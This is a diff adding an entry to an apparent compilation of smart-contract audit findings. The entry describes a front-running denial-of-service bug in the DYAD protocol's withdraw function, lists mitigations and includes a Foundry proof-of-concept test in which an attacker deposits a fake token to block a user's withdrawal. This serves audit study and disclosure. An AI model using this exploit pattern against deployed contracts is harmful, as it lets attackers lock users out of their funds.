@@ -242,3 +242,91 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 5.[High] Attacker can frontrun user’s withdrawals to make them revert without costs
+
+### Valid nft owner
+
+- Summary: The `withdraw` method can be indefinitely blocked by repeatedly depositing 1 WEI with others' IDs just before each block, preventing withdrawals and creating a denial-of-service attack at minimal cost.
+
+- Impact & Recommendation: Mitigations include preventing deposits to unowned dNFT tokens, allowing deposits only through licensed vaults to impose a real cost on attackers, and updating `idToBlockOfLastDeposit` only for vaults licensed by `vaultLicenser` or `keroseneManager`.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-dyad#h-04-attacker-can-frontrun-users-withdrawals-to-make-them-revert-without-costs) & [Report](https://code4rena.com/reports/2024-04-dyad)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity =0.8.17;
+    import "forge-std/console.sol";
+    import "forge-std/Test.sol";
+    import {DeployV2, Contracts} from "../../script/deploy/Deploy.V2.s.sol";
+    import {Licenser}            from "../../src/core/Licenser.sol";
+    import {Parameters}          from "../../src/params/Parameters.sol";
+    import {ERC20}               from "@solmate/src/tokens/ERC20.sol";
+    import {Vault}               from "../../src/core/Vault.sol";
+    import {IAggregatorV3}       from "../../src/interfaces/IAggregatorV3.sol";
+    import {IVaultManager}       from "../../src/interfaces/IVaultManager.sol";
+    contract FakeERC20 is ERC20 {
+        constructor(string memory name, string memory symbol) ERC20(name, symbol, 18) {}
+        function mint(address to, uint256 amount) external {
+            _mint(to, amount);
+        }
+    }
+    contract FakeVaultTest is Test, Parameters {
+        Contracts contracts;
+        address   attacker;
+        FakeERC20 fakeERC20;
+        Vault     fakeVault;
+        function setUp() public {
+            contracts = new DeployV2().run();
+            // Add Vault Manager V2 to the main licenser used by DYAD token, it will allow Vault Manager V2 minting, burning DYAD.
+            vm.prank(MAINNET_OWNER);
+            Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(contracts.vaultManager));
+            attacker =  makeAddr('attacker');
+            fakeERC20 = new FakeERC20('Fake', 'FAKE');
+            fakeVault = new Vault(
+                contracts.vaultManager,
+                ERC20        (fakeERC20),
+                IAggregatorV3(address(0x0))
+            );
+            fakeERC20.mint(attacker, type(uint256).max);
+        }
+        function testPoC_attackerCanFrontRunUserWithdrawalsToPreventThemFromWithdrawing() public {
+            // Make a new address for alice, and mint some ether.
+            address alice = makeAddr('alice');
+            vm.deal(alice, 2 ether);
+            // Misc addresses (WETH and WETH Vault).
+            address weth =     address(contracts.ethVault.asset());
+            address ethVault = address(contracts.ethVault);
+            // Alice start interaction
+            vm.startPrank(alice);
+            // Mint new dNft token for alice
+            uint dNftId = contracts.vaultManager.dNft().mintNft{value: 1 ether}(alice);
+            // Add WETH vault to the newly created dNft
+            contracts.vaultManager.add(dNftId, ethVault);
+            // Deposit Ether to WETH contract to mint weth tokens
+            (bool success, ) = weth.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
+            require(success);
+            // Deposit Weth to vault through Vault Manager
+            contracts.ethVault.asset().approve(address(contracts.vaultManager), 1 ether);
+            contracts.vaultManager.deposit(dNftId, ethVault, 1 ether);
+            vm.stopPrank();
+            vm.roll(block.number + 1);
+            // attacker approve vault manager to spend his fake erc20
+            vm.startPrank(attacker);
+            fakeVault.asset().approve(address(contracts.vaultManager), type(uint256).max);
+            // whenever alice try to withdraw, attacker front-runs alice and make him unable to withdraw at current block
+            // by depositing to alice's dNft a fake token with fake vault
+            contracts.vaultManager.deposit(dNftId, address(fakeVault), 1 ether);
+            vm.stopPrank();
+            // alice try to withdraw but the call reverted with DepositedInSameBlock error
+            // indicate that the attacker success to prevent the withdrawal
+            vm.expectRevert(IVaultManager.DepositedInSameBlock.selector);
+            vm.prank(alice);
+            contracts.vaultManager.withdraw(dNftId, ethVault, 1 ether, alice);
+        }
+    }
+
+  ```
+
+  </details>
